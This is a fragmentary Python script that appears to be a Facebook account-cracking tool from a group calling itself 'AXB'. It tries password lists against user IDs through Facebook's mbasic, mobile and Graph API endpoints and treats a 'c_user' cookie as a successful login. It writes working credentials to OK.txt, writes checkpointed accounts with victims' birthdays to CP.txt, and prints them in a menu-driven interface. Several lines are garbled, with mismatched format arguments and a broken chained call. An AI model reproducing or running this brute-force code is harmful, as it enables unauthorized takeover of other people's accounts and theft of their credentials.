...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#ZANI_KING('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							IMTIAZ_AKING('[â€¢] Result CP saved to CP.txt')
							IMTIAZ_AKING('\n\tCrack Processing...\n')
							IMTIAZ_AKING('\n\tCrack Processing...\n\n');logo()
							...
							ZANI_KING('\n[â€¢] Result OK saved to OK.txt')
							ZANI_KING('[â€¢] Result CP saved to CP.txt')
							ZANI_KING('\n\tCrack Processing...\n\n');logo()
			...
			IMTIAZ_AKING('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			IMTIAZ_AKING(' [1] AXB Method 1 ')
			IMTIAZ_AKING(' [2] AXB Method 2  [ Pro ]')
			IMTIAZ_AKING(' [3] AXB Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [AXB] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if "access_token" in p:
				...
				try:
					...
					IMTIAZ_AKING('\r\033[1;91m[Checkpoint] %s | %s â€¢ %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				try:
					token = ZANI('token.txt').read()
					cp_ttl = Prof_IMtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].ZANI_KING('\r\033[1;91m[Checkpoint] %s | %s â€¢ %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
					...
					pass
				ZANI_KING('\r\033[1;91m[Checkpoint] %s | %s%s      ' % (user,pw,tahun(user)))
				wrt = '%s - %s%s'%(user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			try:
				ua_xiaomi = ZANI('agent.txt', 'r').read()
			except (KeyError, IOError):
				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
			ses = requests.Session()
			...
			if 'c_user' in ses.cookies.get_dict():
				ZANI_KING('\r\033[1;92m[Successful] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					...
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					ZANI_KING('\r\033[1;91m[Checkpoint] %s | %s  %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
...
##     ## ##     ## ########  
 ...
 [*]=============================================
    Author   : AZAN ALI
    Facebook : https://facebook.com/Azan X.
    Team     : AXB
    Connect  : 823165456679
 [*]=============================================
